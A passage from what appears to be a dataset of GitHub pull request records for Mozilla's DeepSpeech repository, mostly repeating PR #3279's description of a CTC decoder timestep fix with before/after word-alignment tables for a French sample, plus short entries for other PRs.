 WordScoreRange(word=aujourd'hui /aujourd'hu/, score=None, ranges=((618, 649),)),
 WordScoreRange(word=on /o/, score=None, ranges=((654, 665),)),
 WordScoreRange(word=a /am/, score=None, ranges=((685, 699),)),
 WordScoreRange(word=santa /santa/, score=None, ranges=((703, 726),)),
 WordScoreRange(word=caterina /qaterina/, score=None, ranges=((729, 756),)),
 WordScoreRange(word=premier /prmier/, score=None, ranges=((762, 783),)),
 WordScoreRange(word=salon /salom/, score=None, ranges=((785, 803),)),
 WordScoreRange(word=géant /géant/, score=None, ranges=((805, 818),)),
 WordScoreRange(word=de /d/, score=None, ranges=((819, 823),)),
 WordScoreRange(word=la /l/, score=None, ranges=((825, 829),)),
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((831, 841),)),
 WordScoreRange(word=du /d/, score=None, ranges=((842, 846),)),
 WordScoreRange(word=monde /mon/, score=None, ranges=((848, 857),))]
```

After this PR, the result in my example is : 
```
[WordScoreRange(word=tous /tous/, score=None, ranges=((0, 54),)), 
 WordScoreRange(word=les /les/, score=None, ranges=((56, 59),)),        
 WordScoreRange(word=amoureux /amoureux/, score=None, ranges=((62, 75),)),
 WordScoreRange(word=de /de/, score=None, ranges=((77, 79),)),          
 WordScoreRange(word=sport /seport/, score=None, ranges=((81, 91),)),           
 WordScoreRange(word=divers /diver/, score=None, ranges=((92, 103),)),
 WordScoreRange(word=s'en /s'en/, score=None, ranges=((105, 113),)),  
 WordScoreRange(word=réjouiront /réjuiront/, score=None, ranges=((114, 140),)),
 WordScoreRange(word=avec /avec/, score=None, ranges=((145, 155),)),  
 WordScoreRange(word=l'approche /l'approche/, score=None, ranges=((158, 185),)),
 WordScoreRange(word=de /de/, score=None, ranges=((189, 192),)),  
 WordScoreRange(word=l'hiver /l'hiver/, score=None, ranges=((194, 212),)),
 WordScoreRange(word=et /et/, score=None, ranges=((214, 216),)),                                                               
 WordScoreRange(word=la /la/, score=None, ranges=((219, 221),)),
 WordScoreRange(word=reprise /reprise/, score=None, ranges=((224, 239),)),                                                                                                                         
 WordScoreRange(word=de /de/, score=None, ranges=((241, 244),)),            
 WordScoreRange(word=la /la/, score=None, ranges=((246, 248),)),              
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((250, 258),)),
 WordScoreRange(word=du /du/, score=None, ranges=((259, 262),)),            
 WordScoreRange(word=monde /monde/, score=None, ranges=((264, 272),)),
 WordScoreRange(word=de //, score=None, ranges=((273, 275),)),
 WordScoreRange(word=ski /ski/, score=None, ranges=((278, 289),)),
 WordScoreRange(word=les /les/, score=None, ranges=((295, 299),)),
 WordScoreRange(word=images /images/, score=None, ranges=((303, 318),)),
 WordScoreRange(word=de /de/, score=None, ranges=((321, 323),)),
 WordScoreRange(word=glisse /glisse/, score=None, ranges=((327, 362),)),
 WordScoreRange(word=retrouvent /retrouvent/, score=None, ranges=((375, 394),)),
 WordScoreRange(word=une /une/, score=None, ranges=((398, 403),)),
 WordScoreRange(word=place /place/, score=None, ranges=((409, 424),)),
 WordScoreRange(word=de /de/, score=None, ranges=((430, 432),)),
 WordScoreRange(word=choix /choix/, score=None, ranges=((437, 448),)),
 WordScoreRange(word=dans /dans/, score=None, ranges=((450, 456),)),
 WordScoreRange(word=les /les/, score=None, ranges=((458, 462),)),
 WordScoreRange(word=pages /pages/, score=None, ranges=((465, 479),)),
 WordScoreRange(word=sportives /sportives/, score=None, ranges=((487, 507),)),
 WordScoreRange(word=de /de/, score=None, ranges=((509, 511),)),
 WordScoreRange(word=vos /vos/, score=None, ranges=((513, 519),)),
 WordScoreRange(word=journaux /journaux/, score=None, ranges=((521, 533),)),
 WordScoreRange(word=télévisés /télévisés/, score=None, ranges=((535, 562),)),
 WordScoreRange(word=deux /deux/, score=None, ranges=((568, 576),)),
 WordScoreRange(word=épreuves /épreuves/, score=None, ranges=((581, 618),)),
 WordScoreRange(word=aujourd'hui /aujourd'hui/, score=None, ranges=((629, 654),)),
 WordScoreRange(word=on /onoro/, score=None, ranges=((662, 680),)),
 WordScoreRange(word=a /am/, score=None, ranges=((685, 699),)),
 WordScoreRange(word=santa /santa/, score=None, ranges=((703, 726),)),
 WordScoreRange(word=caterina /qaterina/, score=None, ranges=((729, 761),)),
 WordScoreRange(word=premier /prmier/, score=None, ranges=((768, 783),)),
 WordScoreRange(word=salon /salom/, score=None, ranges=((785, 803),)),
 WordScoreRange(word=géant /géant/, score=None, ranges=((808, 820),)),
 WordScoreRange(word=de /de/, score=None, ranges=((822, 824),)),
 WordScoreRange(word=la /l/, score=None, ranges=((826, 829),)),
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((833, 842),)),
 WordScoreRange(word=du /d/, score=None, ranges=((843, 846),)),
 WordScoreRange(word=monde /mond/, score=None, ranges=((850, 858),))]
```

We can see that before this PR, there are 17 words where timesteps are too early (about one letter shift, it is visible at the end but not at the begining of words because I have trimed spaces).
After this PR, the fit is almost prefect. For some reason, there are still 3 remaining errors, all in the 4 last words.",godefv,18540039,2020-08-25T11:03:55Z,COLLABORATOR,True,277,31,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5bf5124366ac14d030607d2b8e1a26e85edb4fcc,"PR #3279 - Added some comments, harmonized a few names, removed unneeded spaces"
569,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3279,3279,"The CTC decoder timesteps now corresponds to the timesteps of the most probable CTC path, instead of the earliest timesteps of all possible paths.","This follows the issue #3180 .

I suggest a new way of handling timesteps produced by the CTC decoder. There is no strange heuristic, and I think the logic is clear : when fusing two different paths leading to the same prefix, not only fuse the probabilities (the probabilities are added), but also fuse the timestep sequences (for the last letter in the sequence, choose the timestep from the most probable path).

The place where two different paths leading to the same prefix are fused are the places where `log_sum_exp` is called, because this function fuses the probabilities. So, timesteps would now be fused at the same places.

The other change is that each `PathTrie` node would now store the full sequence of timesteps. This is because one prefix can be an ancestor of another and their timesteps on a given node can differ. Having the full sequence of timesteps in each node, we have no need to duplicate a node with different timesteps, and it is much simpler like that. 
Moreover, it makes sense to store the *full* sequence of timesteps, because the *combined* probabilities are also stored there. The total probability is not the sum of the probability of each output token, and, in the same way, the correct sequence of timesteps is not the concatenation of the timestep of each output token.

Since I need to compare the probability of different paths (to keep the timesteps of the most probable one), it is important to compare paths of the same length (eg. paths from the beginning up to the current time). So, exactly the same way as it is done for the probabilities, I need to know the timesteps of the previous time, and store the timesteps of the current time separately.

In the end, timesteps are handled in a way very similar to the way probabilities are handled.

### Results on an example
To evaluate the resulting timesteps, I first take the argmax of my logits. In my example, it gives :
```
tou_________________________________________________ss  les  _a__mouurreuux  de  se_p_ort__ diiivverrr_  ss'enn__ _r_é___j_uuii__rr__on_t____    aa_v_eecc_   l''aap__p_rroo___chhee_____    de_  ll'hhi__v_e_rr____  et   la   rre__p_rri_ssee  dee  la  c_ouppee ddu  mon_deee      ss__kk_i___      less    ii_mm_a__ggees_   de   _g_ll_i_ss__ssee____________________             ree__t_rrou_vveennt    uunee    __pllaa___cee____      de    _cchhooixx__  d_ans_  lles  _pp_a____ggeess        ssspp_o_r_t_ii_vees_  de  v_o_s_ _jourrnnaauxx  ttéé_l_é___v_ii___ss_é__s__      ddeeu_x_   __é___pprreeuu_vvees___________________          _auu_jjoouurrdd''hhuuii___       _o____nno___rr_o_____d__a___mm________ ___s___a_n______t__a______  _q__a___tt__e___rr_i____n__a_____     __p_r____mmie_r__  s__a___l__o___m___    _g_é____ant__  de   lla  _c_ou_ppee  ddu   m_on___deee____________________________________________________
```
As the logits are the only input of the decoder, I base my evaluation on them instead of comparing with the audio file directly. It is known that the CTC loss does not guarantee alignment between the audio file and the logits, so the best thing the decoder can do is to fit the logits as best as it can. This is reasonable because, in practice, the logits are aligned quite well with the audio file.

Then, for each word, I take the part of the logits corresponding to the output timesteps, take the argmax (as said above), and print the corresponding decoded text. 

Finally, I assume that good timesteps should lead to a good match between the word and its corresponding text decoded from the argmax of the logits.

Before this PR, the result in my example is (text between slashes is from the logits argmax, spaces are trimmed) : 
```
[WordScoreRange(word=tous /tou/, score=None, ranges=((0, 4),)),   
 WordScoreRange(word=les /les/, score=None, ranges=((55, 59),)),       
 WordScoreRange(word=amoureux /amoureu/, score=None, ranges=((60, 74),)),
 WordScoreRange(word=de /d/, score=None, ranges=((75, 78),)),           
 WordScoreRange(word=sport /seport/, score=None, ranges=((80, 90),)),           
 WordScoreRange(word=divers /diver/, score=None, ranges=((91, 102),)),
 WordScoreRange(word=s'en /s'en/, score=None, ranges=((103, 111),)),  
 WordScoreRange(word=réjouiront /réjuiron/, score=None, ranges=((112, 136),)),
 WordScoreRange(word=avec /avec/, score=None, ranges=((141, 153),)),  
 WordScoreRange(word=l'approche /l'approche/, score=None, ranges=((155, 179),)),
 WordScoreRange(word=de /de/, score=None, ranges=((185, 191),)),  
 WordScoreRange(word=l'hiver /l'hive/, score=None, ranges=((192, 206),)),
 WordScoreRange(word=et /e/, score=None, ranges=((208, 215),)),
 WordScoreRange(word=la /la/, score=None, ranges=((217, 221),)),
 WordScoreRange(word=reprise /reprise/, score=None, ranges=((222, 238),)),
 WordScoreRange(word=de /de/, score=None, ranges=((240, 243),)),
 WordScoreRange(word=la /la/, score=None, ranges=((244, 248),)),
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((249, 257),)),
 WordScoreRange(word=du /d/, score=None, ranges=((258, 261),)),
 WordScoreRange(word=monde /monde/, score=None, ranges=((263, 270),)),
 WordScoreRange(word=de /e/, score=None, ranges=((271, 275),)),
 WordScoreRange(word=ski /ski/, score=None, ranges=((276, 286),)),
 WordScoreRange(word=les /les/, score=None, ranges=((290, 298),)),
 WordScoreRange(word=images /image/, score=None, ranges=((300, 316),)),
 WordScoreRange(word=de /d/, score=None, ranges=((318, 322),)),
 WordScoreRange(word=glisse /glisse/, score=None, ranges=((324, 341),)),
 WordScoreRange(word=retrouvent /retrouvent/, score=None, ranges=((363, 394),)),
 WordScoreRange(word=une /une/, score=None, ranges=((395, 402),)),
 WordScoreRange(word=place /place/, score=None, ranges=((404, 419),)),
 WordScoreRange(word=de /de/, score=None, ranges=((425, 432),)),
 WordScoreRange(word=choix /choix/, score=None, ranges=((433, 445),)),
 WordScoreRange(word=dans /dans/, score=None, ranges=((448, 455),)),
 WordScoreRange(word=les /les/, score=None, ranges=((457, 462),)),
 WordScoreRange(word=pages /pages/, score=None, ranges=((463, 478),)),
 WordScoreRange(word=sportives /sportives/, score=None, ranges=((479, 506),)),
 WordScoreRange(word=de /de/, score=None, ranges=((508, 511),)),
 WordScoreRange(word=vos /vos/, score=None, ranges=((512, 518),)),
 WordScoreRange(word=journaux /journaux/, score=None, ranges=((520, 532),)),
 WordScoreRange(word=télévisés /télévisé/, score=None, ranges=((533, 559),)),
 WordScoreRange(word=deux /deux/, score=None, ranges=((563, 575),)),
 WordScoreRange(word=épreuves /épreuve/, score=None, ranges=((577, 598),)),
 WordScoreRange(word=aujourd'hui /aujourd'hu/, score=None, ranges=((618, 649),)),
 WordScoreRange(word=on /o/, score=None, ranges=((654, 665),)),
 WordScoreRange(word=a /am/, score=None, ranges=((685, 699),)),
 WordScoreRange(word=santa /santa/, score=None, ranges=((703, 726),)),
 WordScoreRange(word=caterina /qaterina/, score=None, ranges=((729, 756),)),
 WordScoreRange(word=premier /prmier/, score=None, ranges=((762, 783),)),
 WordScoreRange(word=salon /salom/, score=None, ranges=((785, 803),)),
 WordScoreRange(word=géant /géant/, score=None, ranges=((805, 818),)),
 WordScoreRange(word=de /d/, score=None, ranges=((819, 823),)),
 WordScoreRange(word=la /l/, score=None, ranges=((825, 829),)),
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((831, 841),)),
 WordScoreRange(word=du /d/, score=None, ranges=((842, 846),)),
 WordScoreRange(word=monde /mon/, score=None, ranges=((848, 857),))]
```

After this PR, the result in my example is : 
```
[WordScoreRange(word=tous /tous/, score=None, ranges=((0, 54),)), 
 WordScoreRange(word=les /les/, score=None, ranges=((56, 59),)),        
 WordScoreRange(word=amoureux /amoureux/, score=None, ranges=((62, 75),)),
 WordScoreRange(word=de /de/, score=None, ranges=((77, 79),)),          
 WordScoreRange(word=sport /seport/, score=None, ranges=((81, 91),)),           
 WordScoreRange(word=divers /diver/, score=None, ranges=((92, 103),)),
 WordScoreRange(word=s'en /s'en/, score=None, ranges=((105, 113),)),  
 WordScoreRange(word=réjouiront /réjuiront/, score=None, ranges=((114, 140),)),
 WordScoreRange(word=avec /avec/, score=None, ranges=((145, 155),)),  
 WordScoreRange(word=l'approche /l'approche/, score=None, ranges=((158, 185),)),
 WordScoreRange(word=de /de/, score=None, ranges=((189, 192),)),  
 WordScoreRange(word=l'hiver /l'hiver/, score=None, ranges=((194, 212),)),
 WordScoreRange(word=et /et/, score=None, ranges=((214, 216),)),                                                               
 WordScoreRange(word=la /la/, score=None, ranges=((219, 221),)),
 WordScoreRange(word=reprise /reprise/, score=None, ranges=((224, 239),)),                                                                                                                         
 WordScoreRange(word=de /de/, score=None, ranges=((241, 244),)),            
 WordScoreRange(word=la /la/, score=None, ranges=((246, 248),)),              
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((250, 258),)),
 WordScoreRange(word=du /du/, score=None, ranges=((259, 262),)),            
 WordScoreRange(word=monde /monde/, score=None, ranges=((264, 272),)),
 WordScoreRange(word=de //, score=None, ranges=((273, 275),)),
 WordScoreRange(word=ski /ski/, score=None, ranges=((278, 289),)),
 WordScoreRange(word=les /les/, score=None, ranges=((295, 299),)),
 WordScoreRange(word=images /images/, score=None, ranges=((303, 318),)),
 WordScoreRange(word=de /de/, score=None, ranges=((321, 323),)),
 WordScoreRange(word=glisse /glisse/, score=None, ranges=((327, 362),)),
 WordScoreRange(word=retrouvent /retrouvent/, score=None, ranges=((375, 394),)),
 WordScoreRange(word=une /une/, score=None, ranges=((398, 403),)),
 WordScoreRange(word=place /place/, score=None, ranges=((409, 424),)),
 WordScoreRange(word=de /de/, score=None, ranges=((430, 432),)),
 WordScoreRange(word=choix /choix/, score=None, ranges=((437, 448),)),
 WordScoreRange(word=dans /dans/, score=None, ranges=((450, 456),)),
 WordScoreRange(word=les /les/, score=None, ranges=((458, 462),)),
 WordScoreRange(word=pages /pages/, score=None, ranges=((465, 479),)),
 WordScoreRange(word=sportives /sportives/, score=None, ranges=((487, 507),)),
 WordScoreRange(word=de /de/, score=None, ranges=((509, 511),)),
 WordScoreRange(word=vos /vos/, score=None, ranges=((513, 519),)),
 WordScoreRange(word=journaux /journaux/, score=None, ranges=((521, 533),)),
 WordScoreRange(word=télévisés /télévisés/, score=None, ranges=((535, 562),)),
 WordScoreRange(word=deux /deux/, score=None, ranges=((568, 576),)),
 WordScoreRange(word=épreuves /épreuves/, score=None, ranges=((581, 618),)),
 WordScoreRange(word=aujourd'hui /aujourd'hui/, score=None, ranges=((629, 654),)),
 WordScoreRange(word=on /onoro/, score=None, ranges=((662, 680),)),
 WordScoreRange(word=a /am/, score=None, ranges=((685, 699),)),
 WordScoreRange(word=santa /santa/, score=None, ranges=((703, 726),)),
 WordScoreRange(word=caterina /qaterina/, score=None, ranges=((729, 761),)),
 WordScoreRange(word=premier /prmier/, score=None, ranges=((768, 783),)),
 WordScoreRange(word=salon /salom/, score=None, ranges=((785, 803),)),
 WordScoreRange(word=géant /géant/, score=None, ranges=((808, 820),)),
 WordScoreRange(word=de /de/, score=None, ranges=((822, 824),)),
 WordScoreRange(word=la /l/, score=None, ranges=((826, 829),)),
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((833, 842),)),
 WordScoreRange(word=du /d/, score=None, ranges=((843, 846),)),
 WordScoreRange(word=monde /mond/, score=None, ranges=((850, 858),))]
```

We can see that before this PR, there are 17 words where timesteps are too early (about one letter shift, it is visible at the end but not at the begining of words because I have trimed spaces).
After this PR, the fit is almost prefect. For some reason, there are still 3 remaining errors, all in the 4 last words.",godefv,18540039,2020-08-25T11:03:55Z,COLLABORATOR,True,277,31,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,371ddb84e5113e75846c43fe0455c06124da369b,PR #3279 - Added README.mozilla to tell where the object pool code is from and updated the object pool code from this origin (minor update).
570,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3279,3279,"The CTC decoder timesteps now corresponds to the timesteps of the most probable CTC path, instead of the earliest timesteps of all possible paths.","This follows the issue #3180 .

I suggest a new way of handling timesteps produced by the CTC decoder. There is no strange heuristic, and I think the logic is clear : when fusing two different paths leading to the same prefix, not only fuse the probabilities (the probabilities are added), but also fuse the timestep sequences (for the last letter in the sequence, choose the timestep from the most probable path).

The place where two different paths leading to the same prefix are fused are the places where `log_sum_exp` is called, because this function fuses the probabilities. So, timesteps would now be fused at the same places.

The other change is that each `PathTrie` node would now store the full sequence of timesteps. This is because one prefix can be an ancestor of another and their timesteps on a given node can differ. Having the full sequence of timesteps in each node, we have no need to duplicate a node with different timesteps, and it is much simpler like that. 
Moreover, it makes sense to store the *full* sequence of timesteps, because the *combined* probabilities are also stored there. The total probability is not the sum of the probability of each output token, and, in the same way, the correct sequence of timesteps is not the concatenation of the timestep of each output token.

Since I need to compare the probability of different paths (to keep the timesteps of the most probable one), it is important to compare paths of the same length (eg. paths from the beginning up to the current time). So, exactly the same way as it is done for the probabilities, I need to know the timesteps of the previous time, and store the timesteps of the current time separately.

In the end, timesteps are handled in a way very similar to the way probabilities are handled.

### Results on an example
To evaluate the resulting timesteps, I first take the argmax of my logits. In my example, it gives :
```
tou_________________________________________________ss  les  _a__mouurreuux  de  se_p_ort__ diiivverrr_  ss'enn__ _r_é___j_uuii__rr__on_t____    aa_v_eecc_   l''aap__p_rroo___chhee_____    de_  ll'hhi__v_e_rr____  et   la   rre__p_rri_ssee  dee  la  c_ouppee ddu  mon_deee      ss__kk_i___      less    ii_mm_a__ggees_   de   _g_ll_i_ss__ssee____________________             ree__t_rrou_vveennt    uunee    __pllaa___cee____      de    _cchhooixx__  d_ans_  lles  _pp_a____ggeess        ssspp_o_r_t_ii_vees_  de  v_o_s_ _jourrnnaauxx  ttéé_l_é___v_ii___ss_é__s__      ddeeu_x_   __é___pprreeuu_vvees___________________          _auu_jjoouurrdd''hhuuii___       _o____nno___rr_o_____d__a___mm________ ___s___a_n______t__a______  _q__a___tt__e___rr_i____n__a_____     __p_r____mmie_r__  s__a___l__o___m___    _g_é____ant__  de   lla  _c_ou_ppee  ddu   m_on___deee____________________________________________________
```
As the logits are the only input of the decoder, I base my evaluation on them instead of comparing with the audio file directly. It is known that the CTC loss does not guarantee alignment between the audio file and the logits, so the best thing the decoder can do is to fit the logits as best as it can. This is reasonable because, in practice, the logits are aligned quite well with the audio file.

Then, for each word, I take the part of the logits corresponding to the output timesteps, take the argmax (as said above), and print the corresponding decoded text. 

Finally, I assume that good timesteps should lead to a good match between the word and its corresponding text decoded from the argmax of the logits.

Before this PR, the result in my example is (text between slashes is from the logits argmax, spaces are trimmed) : 
```
[WordScoreRange(word=tous /tou/, score=None, ranges=((0, 4),)),   
 WordScoreRange(word=les /les/, score=None, ranges=((55, 59),)),       
 WordScoreRange(word=amoureux /amoureu/, score=None, ranges=((60, 74),)),
 WordScoreRange(word=de /d/, score=None, ranges=((75, 78),)),           
 WordScoreRange(word=sport /seport/, score=None, ranges=((80, 90),)),           
 WordScoreRange(word=divers /diver/, score=None, ranges=((91, 102),)),
 WordScoreRange(word=s'en /s'en/, score=None, ranges=((103, 111),)),  
 WordScoreRange(word=réjouiront /réjuiron/, score=None, ranges=((112, 136),)),
 WordScoreRange(word=avec /avec/, score=None, ranges=((141, 153),)),  
 WordScoreRange(word=l'approche /l'approche/, score=None, ranges=((155, 179),)),
 WordScoreRange(word=de /de/, score=None, ranges=((185, 191),)),  
 WordScoreRange(word=l'hiver /l'hive/, score=None, ranges=((192, 206),)),
 WordScoreRange(word=et /e/, score=None, ranges=((208, 215),)),
 WordScoreRange(word=la /la/, score=None, ranges=((217, 221),)),
 WordScoreRange(word=reprise /reprise/, score=None, ranges=((222, 238),)),
 WordScoreRange(word=de /de/, score=None, ranges=((240, 243),)),
 WordScoreRange(word=la /la/, score=None, ranges=((244, 248),)),
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((249, 257),)),
 WordScoreRange(word=du /d/, score=None, ranges=((258, 261),)),
 WordScoreRange(word=monde /monde/, score=None, ranges=((263, 270),)),
 WordScoreRange(word=de /e/, score=None, ranges=((271, 275),)),
 WordScoreRange(word=ski /ski/, score=None, ranges=((276, 286),)),
 WordScoreRange(word=les /les/, score=None, ranges=((290, 298),)),
 WordScoreRange(word=images /image/, score=None, ranges=((300, 316),)),
 WordScoreRange(word=de /d/, score=None, ranges=((318, 322),)),
 WordScoreRange(word=glisse /glisse/, score=None, ranges=((324, 341),)),
 WordScoreRange(word=retrouvent /retrouvent/, score=None, ranges=((363, 394),)),
 WordScoreRange(word=une /une/, score=None, ranges=((395, 402),)),
 WordScoreRange(word=place /place/, score=None, ranges=((404, 419),)),
 WordScoreRange(word=de /de/, score=None, ranges=((425, 432),)),
 WordScoreRange(word=choix /choix/, score=None, ranges=((433, 445),)),
 WordScoreRange(word=dans /dans/, score=None, ranges=((448, 455),)),
 WordScoreRange(word=les /les/, score=None, ranges=((457, 462),)),
 WordScoreRange(word=pages /pages/, score=None, ranges=((463, 478),)),
 WordScoreRange(word=sportives /sportives/, score=None, ranges=((479, 506),)),
 WordScoreRange(word=de /de/, score=None, ranges=((508, 511),)),
 WordScoreRange(word=vos /vos/, score=None, ranges=((512, 518),)),
 WordScoreRange(word=journaux /journaux/, score=None, ranges=((520, 532),)),
 WordScoreRange(word=télévisés /télévisé/, score=None, ranges=((533, 559),)),
 WordScoreRange(word=deux /deux/, score=None, ranges=((563, 575),)),
 WordScoreRange(word=épreuves /épreuve/, score=None, ranges=((577, 598),)),
 WordScoreRange(word=aujourd'hui /aujourd'hu/, score=None, ranges=((618, 649),)),
 WordScoreRange(word=on /o/, score=None, ranges=((654, 665),)),
 WordScoreRange(word=a /am/, score=None, ranges=((685, 699),)),
 WordScoreRange(word=santa /santa/, score=None, ranges=((703, 726),)),
 WordScoreRange(word=caterina /qaterina/, score=None, ranges=((729, 756),)),
 WordScoreRange(word=premier /prmier/, score=None, ranges=((762, 783),)),
 WordScoreRange(word=salon /salom/, score=None, ranges=((785, 803),)),
 WordScoreRange(word=géant /géant/, score=None, ranges=((805, 818),)),
 WordScoreRange(word=de /d/, score=None, ranges=((819, 823),)),
 WordScoreRange(word=la /l/, score=None, ranges=((825, 829),)),
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((831, 841),)),
 WordScoreRange(word=du /d/, score=None, ranges=((842, 846),)),
 WordScoreRange(word=monde /mon/, score=None, ranges=((848, 857),))]
```

After this PR, the result in my example is : 
```
[WordScoreRange(word=tous /tous/, score=None, ranges=((0, 54),)), 
 WordScoreRange(word=les /les/, score=None, ranges=((56, 59),)),        
 WordScoreRange(word=amoureux /amoureux/, score=None, ranges=((62, 75),)),
 WordScoreRange(word=de /de/, score=None, ranges=((77, 79),)),          
 WordScoreRange(word=sport /seport/, score=None, ranges=((81, 91),)),           
 WordScoreRange(word=divers /diver/, score=None, ranges=((92, 103),)),
 WordScoreRange(word=s'en /s'en/, score=None, ranges=((105, 113),)),  
 WordScoreRange(word=réjouiront /réjuiront/, score=None, ranges=((114, 140),)),
 WordScoreRange(word=avec /avec/, score=None, ranges=((145, 155),)),  
 WordScoreRange(word=l'approche /l'approche/, score=None, ranges=((158, 185),)),
 WordScoreRange(word=de /de/, score=None, ranges=((189, 192),)),  
 WordScoreRange(word=l'hiver /l'hiver/, score=None, ranges=((194, 212),)),
 WordScoreRange(word=et /et/, score=None, ranges=((214, 216),)),                                                               
 WordScoreRange(word=la /la/, score=None, ranges=((219, 221),)),
 WordScoreRange(word=reprise /reprise/, score=None, ranges=((224, 239),)),                                                                                                                         
 WordScoreRange(word=de /de/, score=None, ranges=((241, 244),)),            
 WordScoreRange(word=la /la/, score=None, ranges=((246, 248),)),              
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((250, 258),)),
 WordScoreRange(word=du /du/, score=None, ranges=((259, 262),)),            
 WordScoreRange(word=monde /monde/, score=None, ranges=((264, 272),)),
 WordScoreRange(word=de //, score=None, ranges=((273, 275),)),
 WordScoreRange(word=ski /ski/, score=None, ranges=((278, 289),)),
 WordScoreRange(word=les /les/, score=None, ranges=((295, 299),)),
 WordScoreRange(word=images /images/, score=None, ranges=((303, 318),)),
 WordScoreRange(word=de /de/, score=None, ranges=((321, 323),)),
 WordScoreRange(word=glisse /glisse/, score=None, ranges=((327, 362),)),
 WordScoreRange(word=retrouvent /retrouvent/, score=None, ranges=((375, 394),)),
 WordScoreRange(word=une /une/, score=None, ranges=((398, 403),)),
 WordScoreRange(word=place /place/, score=None, ranges=((409, 424),)),
 WordScoreRange(word=de /de/, score=None, ranges=((430, 432),)),
 WordScoreRange(word=choix /choix/, score=None, ranges=((437, 448),)),
 WordScoreRange(word=dans /dans/, score=None, ranges=((450, 456),)),
 WordScoreRange(word=les /les/, score=None, ranges=((458, 462),)),
 WordScoreRange(word=pages /pages/, score=None, ranges=((465, 479),)),
 WordScoreRange(word=sportives /sportives/, score=None, ranges=((487, 507),)),
 WordScoreRange(word=de /de/, score=None, ranges=((509, 511),)),
 WordScoreRange(word=vos /vos/, score=None, ranges=((513, 519),)),
 WordScoreRange(word=journaux /journaux/, score=None, ranges=((521, 533),)),
 WordScoreRange(word=télévisés /télévisés/, score=None, ranges=((535, 562),)),
 WordScoreRange(word=deux /deux/, score=None, ranges=((568, 576),)),
 WordScoreRange(word=épreuves /épreuves/, score=None, ranges=((581, 618),)),
 WordScoreRange(word=aujourd'hui /aujourd'hui/, score=None, ranges=((629, 654),)),
 WordScoreRange(word=on /onoro/, score=None, ranges=((662, 680),)),
 WordScoreRange(word=a /am/, score=None, ranges=((685, 699),)),
 WordScoreRange(word=santa /santa/, score=None, ranges=((703, 726),)),
 WordScoreRange(word=caterina /qaterina/, score=None, ranges=((729, 761),)),
 WordScoreRange(word=premier /prmier/, score=None, ranges=((768, 783),)),
 WordScoreRange(word=salon /salom/, score=None, ranges=((785, 803),)),
 WordScoreRange(word=géant /géant/, score=None, ranges=((808, 820),)),
 WordScoreRange(word=de /de/, score=None, ranges=((822, 824),)),
 WordScoreRange(word=la /l/, score=None, ranges=((826, 829),)),
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((833, 842),)),
 WordScoreRange(word=du /d/, score=None, ranges=((843, 846),)),
 WordScoreRange(word=monde /mond/, score=None, ranges=((850, 858),))]
```

We can see that before this PR, there are 17 words where timesteps are too early (about one letter shift, it is visible at the end but not at the begining of words because I have trimed spaces).
After this PR, the fit is almost prefect. For some reason, there are still 3 remaining errors, all in the 4 last words.",godefv,18540039,2020-08-25T11:03:55Z,COLLABORATOR,True,277,31,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,188501a333451b4765a4660d8ce11796b3a07b7c,PR #3279 - Reverted unrelated and unwanted change.
571,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3278,3278,Refactor rlrop condition,"Improve readability.
Split to separate pr from #3268.",DanBmh,18572490,2020-08-25T08:16:44Z,CONTRIBUTOR,True,5,3,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c10f7f1ad669277e7f0424cc7c09e12a4473b5b6,Refactor rlrop condition.
572,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3277,3277,Update docs for matching r2.3,,lissyx,1645737,2020-08-24T19:16:53Z,COLLABORATOR,True,3,3,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e81ee24ede6ff4682e069197931159fd68e5a540,Update docs for matching r2.3
573,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3276,3276,Pr3256,,lissyx,1645737,2020-08-24T18:22:23Z,COLLABORATOR,True,34,29,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2fcba677bbc4e7325e8c4fc7fffe79b9b1cc9582,Implementation of layer-norm in the training script
574,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3276,3276,Pr3256,,lissyx,1645737,2020-08-24T18:22:23Z,COLLABORATOR,True,34,29,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1f54daf007c4e9c9c1f930dc83add3d9415d8bd2,Default for layer_norm set to False
575,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3276,3276,Pr3256,,lissyx,1645737,2020-08-24T18:22:23Z,COLLABORATOR,True,34,29,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b4bc6bfb8a3e2271e0f56f45d95dac12c7595b36,Updating commit of submodule
576,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3276,3276,Pr3256,,lissyx,1645737,2020-08-24T18:22:23Z,COLLABORATOR,True,34,29,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9f3c40ce48c7854fa7c9de5d48126f153937a015,"Replacing old sha with new ones

